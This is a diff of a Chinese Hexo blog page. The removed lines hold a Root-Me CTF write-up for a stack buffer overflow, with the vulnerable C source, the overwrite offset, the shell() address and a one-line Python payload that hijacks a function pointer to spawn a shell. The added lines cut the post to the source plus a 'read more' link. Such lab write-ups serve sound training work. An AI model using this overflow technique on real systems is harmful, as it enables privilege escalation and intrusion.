@@ -333,7 +333,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2020-11-14 11:08:34 / 修改时间：11:09:44" itemprop="dateCreated datePublished" datetime="2020-11-14T11:08:34+08:00">2020-11-14</time>
+      <time title="创建时间：2020-11-14 11:08:34 / 修改时间：11:13:29" itemprop="dateCreated datePublished" datetime="2020-11-14T11:08:34+08:00">2020-11-14</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -392,26 +392,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="ELF-x86-Stack-buffer-overflow-basic-2"><a href="#ELF-x86-Stack-buffer-overflow-basic-2" class="headerlink" title="ELF x86 - Stack buffer overflow basic 2"></a>ELF x86 - Stack buffer overflow basic 2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setreuid(geteuid(), geteuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;!-- more --&gt; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hey dude ! Waaaaazzaaaaaaaa ?!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var;</span><br><span class="line">    <span class="keyword">void</span> (*func)()=sup;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    fgets(buf,<span class="number">133</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="反汇编代码"><a href="#反汇编代码" class="headerlink" title="反汇编代码"></a>反汇编代码</h3><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/DCSycj"><img src="https://s3.ax1x.com/2020/11/14/DCSycj.jpg" alt="DCSycj.jpg"></a></p>
-<p>获取输入后，调用eax寄存器中函数<br>输入存在<code>ebp-0x8c</code>, <code>ebp-0xc</code> 处保存着sup函数地址， 我们要做的就是将该地址换为shell()函数地址</p>
-<h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/DCp9vd"><img src="https://s3.ax1x.com/2020/11/14/DCp9vd.jpg" alt="DCp9vd.jpg"></a></p>
-<p>128字节后，即<code>0xbffffa9c（ebp-0xc)</code>处保存sup()函数地址<br>所以可以直接溢出</p>
-<h3 id="替换为shell"><a href="#替换为shell" class="headerlink" title="替换为shell()"></a>替换为shell()</h3><p>查看shell()函数地址<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/DCpgRe"><img src="https://s3.ax1x.com/2020/11/14/DCpgRe.jpg" alt="DCpgRe.jpg"></a><br>为<code>0x08048516</code></p>
-<h3 id="palyload"><a href="#palyload" class="headerlink" title="palyload"></a>palyload</h3><p><code>(python -c &#39;print &quot;a&quot;*128+&quot;08048516&quot;.decode(&quot;hex&quot;)[::-1]&#39;;cat) | ./ch15</code><br>“08048516”.decode(“hex”) 十六进制表示，所以用十六进制解码</p>
-<pre><code>┌─[✗]─[zentreisender@parrotos]─[~/Documents/root_me/app_system]
-└──╼ $python
-Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
-[GCC 9.3.0] on linux2
-Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
-&gt;&gt;&gt; &quot;08048516&quot;.decode(&quot;hex&quot;)
-&#39;\x08\x04\x85\x16&#39;
-&gt;&gt;&gt; &quot;08048516&quot;.encode(&quot;hex&quot;)
-&#39;3038303438353136&#39;
-&gt;&gt;&gt; </code></pre>
-<p>注意python中的<code>&#39;</code> <code>&quot;</code><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/DC9Ay9"><img src="https://s3.ax1x.com/2020/11/14/DC9Ay9.jpg" alt="DC9Ay9.jpg"></a></p>
-
+          <h2 id="ELF-x86-Stack-buffer-overflow-basic-2"><a href="#ELF-x86-Stack-buffer-overflow-basic-2" class="headerlink" title="ELF x86 - Stack buffer overflow basic 2"></a>ELF x86 - Stack buffer overflow basic 2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setreuid(geteuid(), geteuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hey dude ! Waaaaazzaaaaaaaa ?!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var;</span><br><span class="line">    <span class="keyword">void</span> (*func)()=sup;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    fgets(buf,<span class="number">133</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/11/14/Stack_buffer_overflow_basic_2/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
